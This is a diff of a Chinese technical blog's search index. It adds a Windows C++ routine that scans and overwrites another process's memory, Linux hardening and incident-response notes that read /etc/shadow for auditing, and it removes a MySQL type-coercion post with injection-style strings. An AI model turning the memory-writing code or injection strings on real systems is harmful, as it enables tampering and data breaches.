+                                 systemInfo.dwPageSize,\
+                                 &amp;dwReadBytes)==FALSE){
+				dwSize +=systemInfo.dwPageSize;
+				continue;
+			}
+			for(int i=0;i&lt;dwReadBytes -3;i++){
+				if(*((DWORD *)(lpBuff+i)) ==dwValue){
+					AddrList.push_back((DWORD)lpAddr+i);
+				}
+				if(AddrList.size()==MAX_ADDR_NUM){
+					delete []lpBuff;
+					CloseHandle(hProcess);
+					return true;
+				}
+			}
+			dwSize+=systemInfo.dwPageSize;
+		}
+	}
+	delete []lpBuff;
+	CloseHandle(hProcess);
+	return true;
+}
+
+
+bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,\
+                         DWORD dwValue){
+	HANDLE hProcess = INVALID_HANDLE_VALUE;
+	if(dwProcessId !=GetCurrentProcessId()){
+		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
+		if(hProcess ==NULL)
+			return false;
+	}
+	SIZE_T dwWriteBytes =0;
+	DWORD dwOldProtect;
+	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),\
+                         PAGE_EXECUTE_READWRITE,&amp;dwOldProtect)){
+		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;
+		DWORD dwReturn = GetLastError();
+		cout&lt;&lt;dwReturn&lt;&lt;endl;
+	}
+	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,\
+                           &amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes)){
+		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;
+		DWORD dwReturn = GetLastError();
+		cout&lt;&lt;dwReturn&lt;&lt;endl;
+		return false;
+	}
+	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,\
+                     sizeof(DWORD),dwOldProtect,NULL);
+	CloseHandle(hProcess);
+		return true;
+}
+</code></pre>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+        <tag>小工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker 常用命令</title>
     <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
     <content><![CDATA[<h1>镜像管理</h1>
@@ -100,71 +610,16 @@ docker-compose down
       </tags>
   </entry>
   <entry>
-    <title>kafka笔记</title>
-    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
-    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
-<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
-<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
-<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/image-20210714161917846.png" alt="image-20210714161917846"></p>
-<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
-<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
-<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
-<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
-<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
-<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>kafka</tag>
-        <tag>消息队列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mysql的自动类型转换</title>
-    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
-    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
-<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084058433.png" alt="image-20200722084058433"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082629984.png" alt="image-20200722082629984"></p>
-<p><code>DVWA</code>的<code>user</code>表👆</p>
-<p>在进行以下查询时结果如图：</p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082807883.png" alt="image-20200722082807883"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082829117.png" alt="image-20200722082829117"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084904218.png" alt="image-20200722084904218"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084727031.png" alt="image-20200722084727031"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722083932481.png" alt="image-20200722083932481"></p>
-<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
-<p>而转换的规则也很有意思。</p>
-<p>‘1 and 1=1’ 被当作 1</p>
-<p>‘1 and 1=2’ 也被当作1</p>
-<p>‘2 and 1=1’ 被当作2</p>
-<p>经过更多的测试可以发现</p>
-<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
-<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
-<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
-<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git笔记</title>
     <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git/</url>
-    <content><![CDATA[<h2 id="总体概览"><a class="header-anchor" href="#总体概览"></a>总体概览</h2>
+    <content><![CDATA[<h1>总体概览</h1>
 <p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
 <p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="211915189723300.jpg"></p>
 <p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
 <p>暂存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
 <p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
 <p>远程仓库: 即保存我们代码的服务器，本文以公共版本控制系统：github为例，登录github账号后可直观显示；</p>
-<h2 id="Git特点"><a class="header-anchor" href="#Git特点"></a>Git特点</h2>
+<h1>Git特点</h1>
 <p>1.直接记录快照，而非比较差异</p>
 <p>​	Git只关心文件数据的整体是否发生变化，而不是文件内容的具体差异。当文件整体发生变化时（比较指纹信息），则记录快照；若文件整体不变，则只保存上一版本快照的索引，避免重复存储。</p>
 <p>2.几乎所有操作都是本地执行</p>
@@ -178,9 +633,9 @@ docker-compose down
 <p>​	已提交表示该文件已经被安全地保存在本地数据库；</p>
 <p>​	已修改表示修改了某个文件，但还没有提交保存；</p>
 <p>​	已暂存表示把已修改的文件放在下次提交时要保存的清单中了</p>
-<h2 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h2>
-<h3 id="获得项目的Git仓库"><a class="header-anchor" href="#获得项目的Git仓库"></a>获得项目的Git仓库</h3>
-<h4 id="git-init"><a class="header-anchor" href="#git-init"></a>git init</h4>
+<h1>使用方法</h1>
+<h2 id="获得项目的Git仓库"><a class="header-anchor" href="#获得项目的Git仓库"></a>获得项目的Git仓库</h2>
+<h3 id="git-init"><a class="header-anchor" href="#git-init"></a>git init</h3>
 <p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p>
 <pre><code class="language-shell">git init
 </code></pre>
@@ -190,14 +645,14 @@ docker-compose down
 git add README	#把README加入版本控制（加入暂存区）
 git commit -m 'initial project version'		#提交代码到本地仓库
 </code></pre>
-<h4 id="git-clone"><a class="header-anchor" href="#git-clone"></a>git clone</h4>
+<h3 id="git-clone"><a class="header-anchor" href="#git-clone"></a>git clone</h3>
 <p>git clone用于从服务器上获取git仓库，并且获取的是项目历史的所有数据（每一个文件的每一个版本），服务器上有的数据克隆之后本地也都有了。实际上，即便服务器的磁盘发生故障，用任何一个克隆出来的客户端都可以重建服务器上的仓库，回到当初克隆时的状态。</p>
 <pre><code class="language-shell">git clone [url]
 </code></pre>
 <p>如果希望在克隆的时候，自己定义要新建的项目目录名称，可以在上面的命令末尾指定新的名字：</p>
 <pre><code class="language-shell">git clone git://github.com/schacon/grit.git mygrit
 </code></pre>
-<h3 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h3>
+<h2 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h2>
 <p><strong>查看当前项目的git状态</strong></p>
 <pre><code class="language-shell">git status	# 在项目根目录下运行
 </code></pre>
@@ -212,7 +667,7 @@ git diff --cached
 # -p 表示展开显示每次提交的内容差异，-2 表示仅展示最近的两次提交
 </code></pre>
 <p><a href="https://blog.csdn.net/bdss58/article/details/40537859">理解head和master</a></p>
-<h3 id="基础配置"><a class="header-anchor" href="#基础配置"></a>基础配置</h3>
+<h2 id="基础配置"><a class="header-anchor" href="#基础配置"></a>基础配置</h2>
 <p><strong>查看git配置信息</strong></p>
 <pre><code class="language-shell">git config -l # 显示所有当前配置
 git config --global -l  # 显示所有全局配置
@@ -227,12 +682,12 @@ git remote remove &lt;name&gt; # 删除远程地址
 <pre><code class="language-shell">git config credential.helper store # 设置记住密码
 git config credential.helper 'cache --timeout 0' # 15min后清除密码
 </code></pre>
-<h3 id="工作区-暂存区"><a class="header-anchor" href="#工作区-暂存区"></a>工作区&lt;-&gt;暂存区</h3>
-<h4 id="git-add"><a class="header-anchor" href="#git-add"></a>git add</h4>
+<h2 id="工作区-暂存区"><a class="header-anchor" href="#工作区-暂存区"></a>工作区&lt;-&gt;暂存区</h2>
+<h3 id="git-add"><a class="header-anchor" href="#git-add"></a>git add</h3>
 <pre><code class="language-shell">git add [options] [&lt;file&gt;…]
 </code></pre>
 <p><code>git add</code>是一个多功能命令，它可以将项目文件纳入跟踪范围，也可以将所做的修改暂存到暂存区，<code>git commit</code>只会把已加入暂存区的文件版本提交到本地仓库，所以每对项目文件做一次修改，都要使用git add命令将它加入暂存区，否则提交的可能就是修改之前的版本了。</p>
-<h4 id="gitignore"><a class="header-anchor" href="#gitignore"></a>.gitignore</h4>
+<h3 id="gitignore"><a class="header-anchor" href="#gitignore"></a>.gitignore</h3>
 <p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以在项目根目录下创建如下一个名为 .gitignore 的文件，列出要忽略的文件模式</p>
 <pre><code class="language-text"># 此为注释 – 将被 Git 忽略
 *.a       # 忽略所有 .a 结尾的文件
@@ -249,63 +704,63 @@ doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt
 可以使用标准的 glob 模式匹配。<code> *</code> 匹配模式最后跟反斜杠<code>/</code>说明要忽略的是目录。<br>
 要忽略指定模式以外的文件或目录，可以在模式前加上叹号<code>!</code>取反</p>
 </blockquote>
-<h4 id="git-rm"><a class="header-anchor" href="#git-rm"></a>git rm</h4>
+<h3 id="git-rm"><a class="header-anchor" href="#git-rm"></a>git rm</h3>
 <p><code>git rm &lt;filename&gt;</code>用来将不需要的文件同时从Git仓库和工作目录中删除，如果只是手动从工作目录中删除该文件，则还会在&quot;Changed but not updated&quot;中看到。</p>
 <p>如果希望在工作目录中保留文件，只从git仓库中删除，那么可以加上<code>--cached</code>参数</p>
 <blockquote>
 <p>误删文件恢复（回滚）</p>
 </blockquote>
-<h4 id="git-mv"><a class="header-anchor" href="#git-mv"></a>git mv</h4>
+<h3 id="git-mv"><a class="header-anchor" href="#git-mv"></a>git mv</h3>
 <p>常用于文件移动和重命名</p>
 <pre><code class="language-shell">git mv file_from file_to
 </code></pre>
-<h4 id="git-restore"><a class="header-anchor" href="#git-restore"></a>git restore</h4>
+<h3 id="git-restore"><a class="header-anchor" href="#git-restore"></a>git restore</h3>
 <pre><code class="language-shell">git restore &lt;file&gt;    # 丢弃工作区的修改（包括对文件自身的操作，如添加文件、删除文件）
 git restore --staged &lt;file&gt;    #将暂存区的修改重新放回工作区（包括对文件自身的操作，如添加文件、删除文件）
 </code></pre>
-<h3 id="暂存区-本地仓库"><a class="header-anchor" href="#暂存区-本地仓库"></a>暂存区&lt;-&gt;本地仓库</h3>
-<h4 id="git-commit"><a class="header-anchor" href="#git-commit"></a>git commit</h4>
+<h2 id="暂存区-本地仓库"><a class="header-anchor" href="#暂存区-本地仓库"></a>暂存区&lt;-&gt;本地仓库</h2>
+<h3 id="git-commit"><a class="header-anchor" href="#git-commit"></a>git commit</h3>
 <p>一般使用<code>git comit -m &quot;your comment&quot;</code>将代码提交到本地仓库，提交后工作区清空，再次修改则需要重新<code>git add</code>，如果不加<code>-m</code>参数，那么会启动文本编辑器以输入本次提交的说明。</p>
 <p>每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。</p>
 <p>尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。Git 提供了一个跳过使用暂存区域的方式，只要在提交的时候，加上<code>-a</code> 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 <code>git add</code> 步骤。</p>
-<h3 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h3>
-<h4 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h4>
+<h2 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h2>
+<h3 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h3>
 <p>将本地的分支版本上传到远程并合并</p>
 <pre><code class="language-shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;
 </code></pre>
-<h4 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h4>
+<h3 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h3>
 <p>从远程仓库下载最新的commit，并且同时保留本地分支head和远程分支remotes，需要另外使用<code>git merge</code>合并分支</p>
-<h4 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h4>
+<h3 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h3>
 <p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
-<h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
+<h2 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h2>
 <p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
 <p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/image-20210708151055459.png" alt="image-20210708151055459"></p>
 <p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
-<h4 id="reset版本回退"><a class="header-anchor" href="#reset版本回退"></a>reset版本回退</h4>
+<h3 id="reset版本回退"><a class="header-anchor" href="#reset版本回退"></a>reset版本回退</h3>
 <p>首先<code>git log</code>查看历史提交的版本信息</p>
 <p>得到各个commit的id，即其哈希值</p>
 <p>使用<code>git reset --hard &lt;commitId&gt;</code>切换到各个版本提交时的状态（清空暂存区），如果版本已提交到远程仓库，则需要在本地仓库回退后使用<code>git push -f</code>将操作强制同步到远程仓库。</p>
 <p>但实际上回退之前的版本还是存在的，使用<code>git reflog</code>可以查看历史版本记录，找到已提交过的任何一个版本的commitId，通过commitId仍可以切回最新的未回退的版本。</p>
-<h4 id="revert版本回退"><a class="header-anchor" href="#revert版本回退"></a>revert版本回退</h4>
+<h3 id="revert版本回退"><a class="header-anchor" href="#revert版本回退"></a>revert版本回退</h3>
 <p>使用git reset回退公共远程分支的版本后，需要其他所有人手动用远程master分支覆盖本地master分支，显然，这不是优雅的回退方法，下面我们使用另个一个命令来回退版本：</p>
 <pre><code class="language-shell">git revert HEAD                     //撤销最近一次提交
 git revert HEAD~1                   //撤销最近2次提交
 git revert 0ffaacc                  //撤销0ffaacc这次提交
 </code></pre>
 <p>git revert 命令意思是撤销某次提交。它会产生一个新的提交，虽然代码回退了，但是版本依然是向前的，所以，当你用revert回退之后，所有人pull之后，他们的代码也自动的回退了。</p>
-<h3 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h3>
-<h4 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h4>
+<h2 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h2>
+<h3 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h3>
 <pre><code class="language-shell">git branch                  #列出已有分支
 git branch &lt;branchname&gt;     #创建新分支
 git checkout &lt;branchname&gt;   #切换到分支
 git branch -d &lt;branchname&gt;  #删除分支
 </code></pre>
 <p>在一个分支进行文件修改、新建、删除等操作在commit后不会影响其他分支。</p>
-<h4 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h4>
+<h3 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h3>
 <pre><code class="language-shell">git merge &lt;branchname&gt;    #把 &lt;branchname&gt; 分支合并到当前分支
 </code></pre>
 <p>在将<code>branch2</code>合并到<code>branch1</code>的过程中，branch2中新建文件、删除原有文件、修改原有文件等操作将同步到branch1，当两个分支都做出修改时，可能会出现代码冲突，这时候需要我们手动修改解决冲突后再次提交才能合并成功。</p>
-<h2 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h2>
+<h1>常见问题</h1>
 <ol>
 <li>
 <p>新建GitHub仓库，第一次push时验证账号密码失败</p>
@@ -325,170 +780,363 @@ git branch -d &lt;branchname&gt;  #删除分支
       </tags>
   </entry>
   <entry>
-    <title>Redis笔记</title>
-    <url>/2022/12/27/%E5%B7%A5%E5%85%B7/redis/</url>
-    <content><![CDATA[<h2 id="Redis是什么"><a class="header-anchor" href="#Redis是什么"></a>Redis是什么</h2>
-<p>概括地说：Redis是一个内存数据库（in-memory data store，说白话就是所有的数据都在内存里放着，不过有些内存数据库产品如Redis，在关机、断电等特殊情况下会把数据dump到硬盘里以便后续恢复），但又可以当做<strong>缓存</strong>或者<strong>消息中间件</strong>去使用。</p>
-<h2 id="Redis怎么用"><a class="header-anchor" href="#Redis怎么用"></a>Redis怎么用</h2>
-<h3 id="作为缓存使用"><a class="header-anchor" href="#作为缓存使用"></a>作为缓存使用</h3>
-<p>因为Redis的速度很快，所以可以拿他来缓存一些数据库请求数据、复杂的计算结果、API调用结果、用户的会话状态等，从而提高程序的执行速度。</p>
-<h3 id="作为消息中间件使用"><a class="header-anchor" href="#作为消息中间件使用"></a>作为消息中间件使用</h3>
-<p>在一个异步程序中，有7个线程负责从硬盘的不同目录去取待处理的数据，1个线程去对取来的数据做运算。这时候就可以把Redis当做消息队列来用，取数据的线程把每次取来的数据丢到Redis里面，处理数据的线程只管从Redis里面取数据然后加工，而Redis就起到一个容器+传送带的作用，每个线程都有明确的分工，整个程序的逻辑也更清晰。</p>
+    <title>Linux系统加固</title>
+    <url>/2021/03/07/%E5%AE%89%E5%85%A8%E7%BA%A2%E5%86%9B/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
+    <content><![CDATA[<h2 id="账号安全"><a class="header-anchor" href="#账号安全"></a>账号安全</h2>
+<p><strong>账号相关文件</strong></p>
+<pre><code class="language-bash">/etc/passwd    -- 记录了系统中各用户的一些基本属性，root可写，所有用户可读
+/etc/shadow    -- 记录了所有用户的密码
+/etc/group     -- 记录了用户组属性
+
+1、检查是否存在除root之外UID为0的用户：
+awk -F ':' '($3==0){print $1}' /etc/passwd
+
+2、查询可以远程登录的帐号信息
+awk '/\$1|\$6/{print $1}' /etc/shadow
+
+3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
+more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
+
+4、禁用或删除多余及可疑的帐号
+usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头
+userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除
+</code></pre>
+<p><strong>修改密码策略</strong></p>
+<p>vim /etc/login.defs</p>
+<pre><code>PASS_MAX_DAYS      90               密码最长有效期
+PASS_MIN_DAYS      10               密码修改之间最小的天数
+PASS_MIN_LEN       8                密码长度
+PASS_WARN_AGE      7                口令失效前多少天开始通知用户修改密码
+</code></pre>
+<p><strong>设置密码强度</strong></p>
+<p>vim  /etc/pam.d/common-password</p>
+<p>将原本的</p>
+<pre><code>password requisite  pam_cracklib.so
+</code></pre>
+<p>修改为至少包含一个数字、一个小写字母、一个大写字母、一个特殊字符、且密码长度&gt;=8:</p>
+<pre><code>password requisite  pam_cracklib.so try_first_pass retry=3 dcredit=-1 lcredit=-1 ucredit=-1 ocredit=-1 minlen=8  
+</code></pre>
+<p><strong>限制用户登陆</strong></p>
+<p>vim  /etc/hosts.deny，若禁止192.168.0.1对服务器进行ssh的登陆，添加如下内容</p>
+<pre><code>sshd : 192.168.0.1  
+</code></pre>
+<p><strong>限制登陆次数</strong></p>
+<p>应对暴力破解，我们可以限制登陆次数为5，超过5次登陆失败就锁定**。**vim /etc/pam.d/sshd，在 #%PAM-1.0 的下面，加入下面的内容，表示当密码输入错误达到3次，就锁定用户150秒，如果root用户输入密码错误达到3次，锁定300秒。</p>
+<pre><code>auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time300
+</code></pre>
+<p>锁定用户的管理：</p>
+<pre><code>pam_tally2                             查看被锁定的用户
+
+pam_tally2  --reset  -u  username      将被锁定的用户解锁
+</code></pre>
+<h2 id="目录-文件权限"><a class="header-anchor" href="#目录-文件权限"></a>目录&amp;文件权限</h2>
+<p><strong>存储用户信息的文件</strong></p>
+<p>在用户登陆中非常重要的三个文件</p>
+<p>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
+<p>/etc/shadow 只有root可读 –r-------- 权限值为400</p>
+<p>/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
+<pre><code>chmod 644 /etc/passwd
+chmod 400 /etc/shadow
+chmod 644 /etc/group
+</code></pre>
+<p><strong>文件缺省权限设置</strong></p>
+<pre><code class="language-bash">cp /etc/profile /etc/profile.bak
+vim   /etc/profile
+#添加以下内容
+umask 022	#umask与文件创建后的默认所有权限异或结果即为初始权限
+			#root创建的文件默认所有权限为666，666~022=644 (root可读可写，其他用户只可读)
+
+#执行/etc/profile中的shell命令，直接执行umask命令设置的话重启失效
+source  /etc/profile
+</code></pre>
+<h2 id="应用安全设置"><a class="header-anchor" href="#应用安全设置"></a>应用安全设置</h2>
+<p><strong>FTP</strong></p>
+<p>禁止匿名FTP</p>
+<p>vim  /etc/vsftpd/vsftpd.conf</p>
+<pre><code>anonymous_enable=NO    #如果存在anonymous_enable则修改,如果不存在则手动增加
+</code></pre>
+<p><strong>SSH</strong></p>
+<ol>
+<li>在sshd_config禁止root访问和使用sshv2来让ssh更加安全</li>
+</ol>
+<p>vim /etc/ssh/sshd_config</p>
+<pre><code>PermitRootLogin    no
+</code></pre>
+<ol start="2">
+<li>设置SSH空闲超时退出时间,可降低未授权用户访问其他用户ssh会话的风险</li>
+</ol>
+<p>编辑/etc/ssh/sshd_config，将ClientAliveInterval 设置为300到900，即5-15分钟，将ClientAliveCountMax设置为0-3之间。</p>
+<pre><code>ClientAliveInterval 600
+ClientAliveCountMax 2
+</code></pre>
+<ol start="3">
+<li>设置较低的Max AuthTrimes参数将降低SSH服务器被暴力攻击成功的风险</li>
+</ol>
+<p>在/etc/ssh/sshd_config中取消MaxAuthTries注释符号#，设置最大密码尝试失败次数3-6，建议为4：</p>
+<pre><code>MaxAuthTries 4
+</code></pre>
+<p><strong>TELNET</strong></p>
+<p>Telnet使用明文传输数据，存在安全隐患，应该避免使用</p>
+<p>执行如下语句，查看telnet服务是否在运行</p>
+<pre><code class="language-bash">netstat -na | grep &quot;:23&quot;
+</code></pre>
+<p>若正在运行则关闭Telnet服务，在/etc/xinetd.d/telnet中进行配置</p>
+<pre><code>disable=yes
+</code></pre>
+<h2 id="网络设置"><a class="header-anchor" href="#网络设置"></a>网络设置</h2>
+<p><strong>IPTABLES</strong></p>
+<p>根据需求合理配置防火墙</p>
+<p>比如将<code>INPUT</code>链默认规则设为<code>DROP</code>，再添加规则将需要开放的端口设置为<code>ACCEPT</code></p>
+<pre><code class="language-bash">#将INPUT链默认规则设置为DROP
+iptables -P INPUT DROP
+
+#按需添加规则使得开放端口能够接收数据包
+#开放SSH
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+#开放80端口
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+#...
+</code></pre>
+<p><strong>TCP SYN保护机制</strong></p>
+<pre><code class="language-bash">echo“1”&gt;/proc/sys/net/ipv4/tcp_syncookies //默认为1，一般不用设置
+</code></pre>
+<p>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击</p>
 ]]></content>
       <categories>
-        <category>工具</category>
+        <category>安全红军</category>
       </categories>
       <tags>
-        <tag>消息队列</tag>
-        <tag>redis</tag>
+        <tag>系统配置</tag>
       </tags>
   </entry>
   <entry>
-    <title>在Markdown中使用emoji表情</title>
-    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
-    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
-<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
-<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
-<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
-<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
-<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
-<pre><code>npm un hexo-renderer-marked -S
+    <title>如何做好应急响应</title>
+    <url>/2021/03/08/%E5%AE%89%E5%85%A8%E7%BA%A2%E5%86%9B/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
+    <content><![CDATA[<h1>1、整体思路</h1>
+<p>1）准备</p>
+<p>准备检测工具、确定相关人员。</p>
+<p>2）检测与分析</p>
+<p>入侵事件研判，检索分析态势感知等安全设备产生入侵告警和相关日志，确定攻击者及威胁影响范围。</p>
+<p>3）抑制缓解</p>
+<p>封堵攻击源、控制威胁影响范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境。</p>
+<p>4）攻击溯源</p>
+<p>综合分析安全设备告警、日志，主机系统日志、开放服务日志，确定攻击者入侵路径，及时修补存在的漏洞。</p>
+<p>5）业务恢复</p>
+<h1>2、入侵检查</h1>
+<h2 id="2-1-Linux"><a class="header-anchor" href="#2-1-Linux"></a>2.1 Linux</h2>
+<h3 id="2-1-1-常用命令"><a class="header-anchor" href="#2-1-1-常用命令"></a>2.1.1 常用命令</h3>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>last</td>
+<td>显示的是目前与过去登入系统的用户相关信息</td>
+</tr>
+<tr>
+<td>lastlog</td>
+<td>显示所有用户的登录情况</td>
+</tr>
+<tr>
+<td>lastb</td>
